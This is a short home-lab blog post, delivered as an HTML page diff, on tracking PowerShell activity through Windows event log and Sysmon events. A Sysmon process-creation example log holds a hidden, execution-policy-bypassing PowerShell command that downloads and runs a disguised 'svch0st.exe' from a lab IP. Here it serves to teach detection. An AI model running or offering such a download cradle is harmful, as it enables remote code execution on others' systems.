@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Investigating Powershell Activity - </title><meta name="Description" content="Cybersecurity Blog filled with CTF Writeups, HomeLabs, Project"><meta property="og:title" content="Investigating Powershell Activity" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/investigating-powershell-activity/tracking-powershell-activity/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-05-23T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-05-23T00:00:00+00:00" /><meta property="og:site_name" content="SecurityNguyen Site" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Investigating Powershell Activity"/>
+<meta name="twitter:description" content=""/>
+<meta name="application-name" content="SecurityNguyen">
+<meta name="apple-mobile-web-app-title" content="SecurityNguyen"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="/posts/investigating-powershell-activity/tracking-powershell-activity/" /><link rel="prev" href="/posts/suspiciousprocessactivity/suspicious-process-activity/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Investigating Powershell Activity",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/posts\/investigating-powershell-activity\/tracking-powershell-activity\/"
+        },"genre": "posts","keywords": "Fundamentals, PowerShell","wordcount":  447 ,
+        "url": "\/posts\/investigating-powershell-activity\/tracking-powershell-activity\/","datePublished": "2024-05-23T00:00:00+00:00","dateModified": "2024-05-23T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Nguyen Nguyen"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="">SecurityNguyen</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="">SecurityNguyen</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Investigating Powershell Activity</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/tryhardnguyen" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Nguyen Nguyen</a></span>&nbsp;<span class="post-category">included in <a href="/categories/homelabs/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Homelabs</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-05-23">2024-05-23</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;447 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#window-event-log">Window Event Log</a>
+      <ul>
+        <li><a href="#event-id-4688-process-has-been-created">Event ID: 4688 Process has been created</a></li>
+        <li><a href="#event-id-400-powershell-logging">Event ID: 400 Powershell Logging</a></li>
+        <li><a href="#event-id-800--4103-module-loading-and-add-type-logging">Event ID: 800 &amp; 4103 Module loading and Add-Type logging</a></li>
+        <li><a href="#event-id-4104-script-block-logging">Event ID: 4104 Script Block logging</a></li>
+      </ul>
+    </li>
+    <li><a href="#sysmon-events">Sysmon Events</a>
+      <ul>
+        <li><a href="#event-id-1-process-creation">Event ID: 1 Process Creation</a></li>
+        <li><a href="#event-id-7-image-loaded">Event ID: 7 Image Loaded</a></li>
+        <li><a href="#eventid-10-process-access-another-process">EventID: 10 Process access another process.</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Note: If you need to zoom in, you can click on the image.</p>
+<style>
+	.zoom {
+	            transition: transform 0.3s;
+	            cursor: pointer;
+	        }
+	        
+	        .overlay {
+	            position: fixed;
+	            top: 0;
+	            left: 0;
+	            width: 100%;
+	            height: 100%;
+	            background-color: rgba(0, 0, 0, 0.5);
+	            display: none;
+	            justify-content: center;
+	            align-items: center;
+	            z-index: 999;
+	            pointer-events: none;
+	        }
+	        
+	        .zoomed-image {
+	            max-width: 80%;
+	            max-height: 80%;
+	            transition: transform 0.3s;
+	        }
+	        
+	        .zoomed-image.zoomed {
+	            transform: scale(1.5);
+	        }
+</style>
+<p>In this blog post, we will cover how to track PowerShell activity. Let&rsquo;s start off with some Windows Event Log.</p>
+<h2 id="window-event-log">Window Event Log</h2>
+<h3 id="event-id-4688-process-has-been-created">Event ID: 4688 Process has been created</h3>
+<p>Allow us to know when PowerShell was started.
+<br>
+<br>
+From the picture below, we can see that powershell.exe was started on <code>May 2023, 2024 @ 1:45:35</code>.
+<br>
+<img class="zoom" src="/images/TrackingPSActivity/PowershellCreation.png"></p>
+<div class="overlay">
+        <img class="zoomed-image" src="/images/SuspiciousProcessActivity/PowershellCreation.png">
+</div>
+<br>
+<p>Additionally, in Windows, each command you run has it own separate process. As you can see from the picture below,
+<br>
+<img class="zoom" src="/images/TrackingPSActivity/PowershellCreation.png"></p>
+<div class="overlay">
+        <img class="zoomed-image" src="/images/TrackingPSActivity/PowershellCreation.png">
+</div>
+<br>
+We see that the process id of powershell.exe (5372) is the parent process id of whoami.exe. What does that mean? That essentially mean that a user used PowerShell and used the whoami command.
+<h3 id="event-id-400-powershell-logging">Event ID: 400 Powershell Logging</h3>
+<p>This event ID is similar to event ID: 4688. The only difference is that this event id only track when Powershell.exe is started.
+<br>
+Details:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Engine state is changed from None to Available. 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Details: 
+</span></span><span class="line"><span class="cl">	NewEngineState=Available
+</span></span><span class="line"><span class="cl">	PreviousEngineState=None
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	SequenceNumber=13
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	HostName=ConsoleHost
+</span></span><span class="line"><span class="cl">	HostVersion=5.1.19041.4412
+</span></span><span class="line"><span class="cl">	HostId=be286975-3018-400f-b789-f596ce246438
+</span></span><span class="line"><span class="cl">	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+</span></span><span class="line"><span class="cl">	EngineVersion=5.1.19041.4412
+</span></span><span class="line"><span class="cl">	RunspaceId=a738cd72-eb7d-4c73-80bf-091eea0eaa39
+</span></span><span class="line"><span class="cl">	PipelineId=
+</span></span><span class="line"><span class="cl">	CommandName=
+</span></span><span class="line"><span class="cl">	CommandType=
+</span></span><span class="line"><span class="cl">	ScriptName=
+</span></span><span class="line"><span class="cl">	CommandPath=
+</span></span><span class="line"><span class="cl">	CommandLine=
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="event-id-800--4103-module-loading-and-add-type-logging">Event ID: 800 &amp; 4103 Module loading and Add-Type logging</h3>
+<p>Logs all loaded modules.</p>
+<h3 id="event-id-4104-script-block-logging">Event ID: 4104 Script Block logging</h3>
+<p>Log the PowerShell script. If a long PowerShell script is run, then it will divide the script into multiple parts.
+<br>
+Example:
+<br>
+<img class="zoom" src="/images/TrackingPSActivity/4104.png"></p>
+<div class="overlay">
+        <img class="zoomed-image" src="/images/TrackingPSActivity/4104.png">
+</div>
+<br>
+<h2 id="sysmon-events">Sysmon Events</h2>
+<h3 id="event-id-1-process-creation">Event ID: 1 Process Creation</h3>
+<p>Track when a process have been created and the command line that the process ran.</p>
+<p>Example:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Process Create:
+</span></span><span class="line"><span class="cl">RuleName: technique_id=T1059.001,technique_name=PowerShell
+</span></span><span class="line"><span class="cl">UtcTime: 2024-05-23 19:03:05.132
+</span></span><span class="line"><span class="cl">ProcessGuid: {e58af071-92e9-664f-4204-000000002500}
+</span></span><span class="line"><span class="cl">ProcessId: 18232
+</span></span><span class="line"><span class="cl">Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+</span></span><span class="line"><span class="cl">FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
+</span></span><span class="line"><span class="cl">Description: Windows PowerShell
+</span></span><span class="line"><span class="cl">Product: Microsoft® Windows® Operating System
+</span></span><span class="line"><span class="cl">Company: Microsoft Corporation
+</span></span><span class="line"><span class="cl">OriginalFileName: PowerShell.EXE
+</span></span><span class="line"><span class="cl">CommandLine: &#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#34; -w hidden -ep bypass -nop -c &#34;IEX ((New-Object System.Net.Webclient).DownloadString(&#39;http://192.168.109.6:9000/svch0st.exe&#39;))&#34;
+</span></span><span class="line"><span class="cl">CurrentDirectory: C:\Users\Administrator\
+</span></span><span class="line"><span class="cl">User: TESTDUMMY\Administrator
+</span></span><span class="line"><span class="cl">LogonGuid: {e58af071-f906-664e-5117-120000000000}
+</span></span><span class="line"><span class="cl">LogonId: 0x121751
+</span></span><span class="line"><span class="cl">TerminalSessionId: 1
+</span></span><span class="line"><span class="cl">IntegrityLevel: High
+</span></span><span class="line"><span class="cl">Hashes: SHA1=801262E122DB6A2E758962896F260B55BBD0136A,MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
+</span></span><span class="line"><span class="cl">ParentProcessGuid: {e58af071-92d4-664f-4004-000000002500}
+</span></span><span class="line"><span class="cl">ParentProcessId: 16720
+</span></span><span class="line"><span class="cl">ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+</span></span><span class="line"><span class="cl">ParentCommandLine: &#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#34; 
+</span></span><span class="line"><span class="cl">ParentUser: TESTDUMMY\Administrator
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="event-id-7-image-loaded">Event ID: 7 Image Loaded</h3>
+<p>Better source for gaining visibility into PowerShell since it will record any process that runs PowerShell by focusing on the modload for <code>System.Management.Automation.dll</code> and <code>System.Management.Automation.ni.dll</code>.</p>
+<h3 id="eventid-10-process-access-another-process">EventID: 10 Process access another process.</h3>
+<p>This eventid track when an process access another process.
+<br>
+<br>
+Example:
+<br></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Process accessed:
+</span></span><span class="line"><span class="cl">RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
+</span></span><span class="line"><span class="cl">UtcTime: 2024-05-23 01:55:15.261
+</span></span><span class="line"><span class="cl">SourceProcessGUID: {e58af071-96c2-664f-6e04-000000002500}
+</span></span><span class="line"><span class="cl">SourceProcessId: 19452
+</span></span><span class="line"><span class="cl">SourceThreadId: 14772
+</span></span><span class="line"><span class="cl">SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+</span></span><span class="line"><span class="cl">TargetProcessGUID: {e58af071-ad33-664f-a704-000000002500}
+</span></span><span class="line"><span class="cl">TargetProcessId: 16164
+</span></span><span class="line"><span class="cl">TargetImage: C:\Windows\system32\whoami.exe
+</span></span><span class="line"><span class="cl">GrantedAccess: 0x1FFFFF
+</span></span><span class="line"><span class="cl">CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9e9c4|C:\Windows\System32\KERNELBASE.dll+59655|C:\Windows\System32\KERNELBASE.dll+566d6|C:\Windows\System32\KERNEL32.DLL+1cec4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\9027dc90269bbcb49452585e8fd17bdd\System.ni.dll+3512b6|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\9027dc90269bbcb49452585e8fd17bdd\System.ni.dll+2b3c09|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\9027dc90269bbcb49452585e8fd17bdd\System.ni.dll+2b3579|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\d7c44cac86eb32467f847ca506483629\System.Management.Automation.ni.dll+12826a9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\d7c44cac86eb32467f847ca506483629\System.Management.Automation.ni.dll+1198b2a|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\d7c44cac86eb32467f847ca506483629\System.Management.Automation.ni.dll+12441cd|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\d7c44cac86eb32467f847ca506483629\System.Management.Automation.ni.dll+1243e8b|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\d7c44cac86eb32467f847ca506483629\System.Management.Automation.ni.dll+1319e8f|UNKNOWN(00007FFA3BAC6611)
+</span></span><span class="line"><span class="cl">SourceUser: TESTDUMMY\Administrator
+</span></span><span class="line"><span class="cl">TargetUser: TESTDUMMY\Administrator
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Looking above, we see that PowerShell was seen accessing whoami.exe</p>
+<!-- Zoom Animation Feature -->
+<script>
+	const zooms = document.querySelectorAll('.zoom');
+	const overlay = document.querySelector('.overlay');
+	const zoomedImage = document.querySelector('.zoomed-image');
+	
+	zooms.forEach(function(zoom) {
+		zoom.addEventListener('click', function() {
+			overlay.style.display = 'flex';
+			overlay.style.pointerEvents = 'auto';
+			zoomedImage.src = zoom.src;
+			zoomedImage.classList.add('zoomed');
+		});
+	});
+	
+	overlay.addEventListener('click', function() {
+		overlay.style.display = 'none';
+		overlay.style.pointerEvents = 'none';
+		zoomedImage.classList.remove('zoomed');
+	});
+</script></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-05-23</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="/posts/investigating-powershell-activity/tracking-powershell-activity/" data-title="Investigating Powershell Activity" data-hashtags="Fundamentals,PowerShell"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="/posts/investigating-powershell-activity/tracking-powershell-activity/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/fundamentals/">Fundamentals</a>,&nbsp;<a href="/tags/powershell/">PowerShell</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/suspiciousprocessactivity/suspicious-process-activity/" class="prev" rel="prev" title="Suspicious Process Activity"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Suspicious Process Activity</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.111.3">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/tryhardnguyen" target="_blank">Nguyen Nguyen</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/twemoji@14.0.2/dist/twemoji.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"twemoji":true};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
